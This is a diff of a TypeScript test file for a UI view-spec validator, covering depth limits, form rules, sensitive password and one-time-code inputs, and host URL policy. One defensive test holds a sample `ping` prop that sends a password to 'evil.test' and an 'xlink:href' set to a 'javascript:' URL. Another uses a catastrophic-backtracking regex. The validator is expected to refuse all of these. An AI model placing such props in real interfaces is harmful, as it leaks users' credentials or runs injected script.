@@ -64,22 +64,31 @@ describe("validateViewSpec: input", () => {
       [42, ["invalid-type"]],
     ];
     for (const [input, codes] of hostile) expect(validateViewSpec(input).issues.map((issue) => issue.code)).toEqual(codes);
-    // Whether 1000 levels fit the call stack depends on the engine; either answer is one issue, never a throw.
-    const thousand = validateViewSpec(doc(nest(1000))).issues;
-    expect(thousand).toHaveLength(1);
-    expect(["limit-exceeded", "too-deep"]).toContain(thousand[0]?.code);
     expect(({} as Record<string, unknown>).polluted).toBeUndefined();
-    const deepResult = validateViewSpec(doc(nest(300)));
+    const deepResult = validateViewSpec(doc(nest(100)));
     expect(deepResult.ok).toBe(true);
     expect(pairs(deepResult)).toEqual([["limit-exceeded", `/root${"/children/0".repeat(LIMITS.depth + 1)}`]]);
   });
 
-  it("reports a document nested past any call stack as too-deep, an error, without throwing", () => {
+  it("refuses arrays and objects nested past LIMITS.jsonDepth as too-deep, an error, where they pass it", () => {
     let deep = '"leaf"';
     for (let i = 0; i < 200_000; i += 1) deep = `{"component":"Stack","children":[${deep}]}`;
-    const result = validateViewSpec(`{"version":2,"title":"t","root":${deep}}`);
-    expect(result.ok).toBe(false);
-    expect(pairs(result)).toEqual([["too-deep", ""]]);
+    const text = `{"version":2,"title":"t","root":${deep}}`;
+    // The document is level 1 and node k level 2 + 2k, so level 257 is node 127's children array.
+    expect(LIMITS.jsonDepth).toBe(256);
+    const past = `/root${"/children/0".repeat(127)}/children`;
+    for (const input of [text, JSON.parse(text) as unknown]) {
+      const result = validateViewSpec(input);
+      expect(result).toMatchObject({ ok: false, renderable: false });
+      expect(pairs(result)).toEqual([["too-deep", past]]);
+    }
+    // Depth in a value counts as in nodes: a 5000-level data value is refused as a whole.
+    let value: unknown = 1;
+    for (let i = 0; i < 5000; i += 1) value = [value];
+    const data = doc("x", { data: { deep: { type: "static", value } } });
+    expect(pairs(validateViewSpec(data))[0]?.[0]).toBe("too-deep");
+    const shallow = doc("x", { data: { deep: { type: "static", value: JSON.parse("[".repeat(250) + "]".repeat(250)) as unknown } } });
+    expect(validateViewSpec(shallow).ok).toBe(true);
   });
 
   it("gives every issue the severity its code has", () => {
@@ -696,10 +705,14 @@ describe("validateViewSpec: warnings", () => {
       forms: {
         f: {
           fields: {
-            n: { type: "number", initialValue: "5", rules: { minLength: 1, min: "1" } },
+            n: { type: "number", initialValue: "five", rules: { minLength: 1, min: "1" } },
             d: { type: "date", initialValue: "2026-02-30", rules: { max: "soon" } },
             t: { rules: { pattern: "([a-z" } },
             b: { type: "boolean", initialValue: { $ref: "state.nope" } },
+            // As the forms read them: numeric text is a number field's value, a text field's min/max bound its numeric content.
+            age: { type: "number", initialValue: "42", rules: { min: 18 } },
+            code: { initialValue: 7, rules: { min: 100, max: 999 } },
+            on: { type: "boolean", initialValue: "yes", rules: { max: 1 } },
           },
         },
       },
@@ -712,7 +725,16 @@ describe("validateViewSpec: warnings", () => {
       ["unusable-value", "/forms/f/fields/d/initialValue", undefined],
       ["unusable-value", "/forms/f/fields/t/rules/pattern", undefined],
       ["undeclared-name", "/forms/f/fields/b/initialValue/$ref", undefined],
+      ["unusable-value", "/forms/f/fields/on/rules/max", undefined],
+      ["unusable-value", "/forms/f/fields/on/initialValue", undefined],
     ]);
+  });
+
+  it("refuses a pattern that can backtrack catastrophically, as the forms do", () => {
+    const value = doc("x", { forms: { f: { fields: { p: { initialValue: `${"a".repeat(40)}!`, rules: { pattern: "^(a+)+$" } } } } } });
+    const [issue] = validateViewSpec(value).issues;
+    expect(issue).toMatchObject({ code: "unusable-value", path: "/forms/f/fields/p/rules/pattern" });
+    expect(issue?.message).toMatch(/exponential/);
   });
 
   it("warns on keys out of streaming order, the depth cap, long handler lists and deep onSuccess chains", () => {
@@ -759,7 +781,106 @@ describe("validateViewSpec: warnings", () => {
       ["sensitive-component", "/root/children/0/component"],
       ["sensitive-component", "/root/children/1/component"],
     ]);
-    expect(warnings(value, { allowSensitive: ["OTPInput"] }).map(([, path]) => path)).toEqual(["/root/children/0/component"]);
-    expect(warnings(value, { allowSensitive: true })).toEqual([]);
+    expect(warnings(value, { policy: { allowSensitive: ["OTPInput"] } }).map(([, path]) => path)).toEqual(["/root/children/0/component"]);
+    expect(warnings(value, { policy: { allowSensitive: true } })).toEqual([]);
+  });
+});
+
+describe("validateViewSpec: the host's policy and the verdicts", () => {
+  const codes = (input: unknown, options?: ValidateOptions) => validateViewSpec(input, options).issues.map((issue) => [issue.code, issue.path]);
+
+  it("refuses a password or one-time-code control as sensitive unless the host allows it", () => {
+    const value = doc({
+      component: "Field",
+      props: { name: "pw" },
+      children: [
+        { component: "Input", props: { type: "password" } },
+        { component: "Input", props: { autoComplete: "username one-time-code" } },
+        { component: "Input", props: { autoComplete: "cc-number" } },
+        { component: "Input", props: { type: "email", autoComplete: "email" } },
+      ],
+    });
+    const sensitive = codes(value).filter(([code]) => code === "sensitive-component");
+    expect(sensitive.map(([, path]) => path)).toEqual([
+      "/root/children/0/props/type",
+      "/root/children/1/props/autoComplete",
+      "/root/children/2/props/autoComplete",
+    ]);
+    expect(codes(value, { policy: { allowSensitive: ["Input"] } }).filter(([code]) => code === "sensitive-component")).toEqual([]);
+    expect(validateViewSpec(value).renderable).toBe(false);
+  });
+
+  it("drops `ping` and any namespaced (`:`) prop: the exfiltration and xlink routes", () => {
+    const value = doc({
+      component: "Link",
+      props: { href: "/help", ping: { $concat: ["https://evil.test/p?pw=", { $ref: "state.pw" }] }, "xlink:href": "javascript:alert(1)", PING: "/x" },
+      children: ["Help"],
+    }, { state: { pw: "" } });
+    expect(codes(value)).toEqual([
+      ["forbidden-prop", "/root/props/ping"],
+      ["forbidden-prop", "/root/props/xlink:href"],
+      ["forbidden-prop", "/root/props/PING"],
+    ]);
+  });
+
+  it("says a `type` outside the control's set is dropped (no file picker)", () => {
+    const [issue] = validateViewSpec(doc({ component: "Input", props: { type: "file", "aria-label": "Upload" } })).issues;
+    expect(issue).toMatchObject({ code: "invalid-prop-value", path: "/root/props/type" });
+    expect(issue?.message).toMatch(/drops any other value/);
+  });
+
+  it("warns on a data-* attribute a component has no element to carry, pointing at the part that does", () => {
+    const value = doc({ component: "Dialog", props: { "data-tour": "settings" }, children: [{ component: "Dialog.Content", props: { "data-tour": "x" }, children: ["x"] }] });
+    expect(validateViewSpec(value).issues.map((issue) => [issue.code, issue.path, issue.suggestion])).toEqual([
+      ["unknown-prop", "/root/props/data-tour", '"Dialog.Content"'],
+    ]);
+    expect(codes(doc({ component: "Card", props: { "data-tour": "x" } }))).toEqual([]);
+  });
+
+  it("judges URLs with the host's predicates when it gives them", () => {
+    const value = doc({ component: "Avatar", props: { src: "https://cdn.example/me.png", name: "Me" } }, { data: { d: { type: "api", endpoint: "https://api.example/x" } } });
+    expect(codes(value)).toEqual([
+      ["refused-url", "/data/d/endpoint"],
+      ["refused-url", "/root/props/src"],
+    ]);
+    const policy = { allowUrl: (url: URL) => url.hostname === "api.example", allowImageUrl: (url: URL) => url.hostname === "cdn.example" };
+    expect(codes(value, { policy })).toEqual([]);
+    expect(codes(value, { policy: { allowImageUrl: () => false } })).toEqual([
+      ["refused-url", "/data/d/endpoint"],
+      ["refused-url", "/root/props/src"],
+    ]);
+  });
+
+  it("is renderable when nothing blocks rendering; strict fails on any warning", () => {
+    const clean = doc({ component: "Card", children: ["x"] });
+    const dropped = doc({ component: "Card", props: { className: "p-4" }, children: ["x"] });
+    const blocked = doc({ component: "Crad", children: ["x"] });
+    expect(validateViewSpec(clean)).toMatchObject({ ok: true, renderable: true });
+    expect(validateViewSpec(dropped)).toMatchObject({ ok: true, renderable: true });
+    expect(validateViewSpec(blocked)).toMatchObject({ ok: true, renderable: false });
+    const strict = validateViewSpec(dropped, { strict: true });
+    expect(strict).toMatchObject({ ok: false, renderable: true });
+    expect(strict.spec).toBeUndefined();
+    expect(validateViewSpec(clean, { strict: true })).toMatchObject({ ok: true, renderable: true });
+    expect(validateViewSpec("{")).toMatchObject({ ok: false, renderable: false });
+  });
+
+  it("reads the host's icon names", () => {
+    const value = doc({ component: "Icon", props: { name: "rocket-ship" } });
+    expect(codes(value)).toEqual([["unknown-icon", "/root/props/name"]]);
+    expect(codes(value, { iconNames: ["rocket-ship"] })).toEqual([]);
+  });
+});
+
+describe("validateViewSpec: closed records", () => {
+  it("warns on a key outside a closed record prop, suggesting the near one", () => {
+    const value = doc({ component: "Grid", props: { columns: { base: 1, lg: 3, "@xl": 4 } }, children: ["x"] });
+    expect(validateViewSpec(value).issues.map((issue) => [issue.code, issue.path, issue.suggestion])).toEqual([
+      ["unknown-prop", "/root/props/columns/lg", '"@lg"'],
+    ]);
+    expect(validateViewSpec(doc({ component: "Grid", props: { columns: 2 }, children: ["x"] })).issues).toEqual([]);
+    expect(validateViewSpec(doc({ component: "Breadcrumbs", props: { labels: { navv: "Path" } }, children: [] })).issues.map((issue) => issue.suggestion)).toEqual([
+      '"nav"',
+    ]);
   });
 });
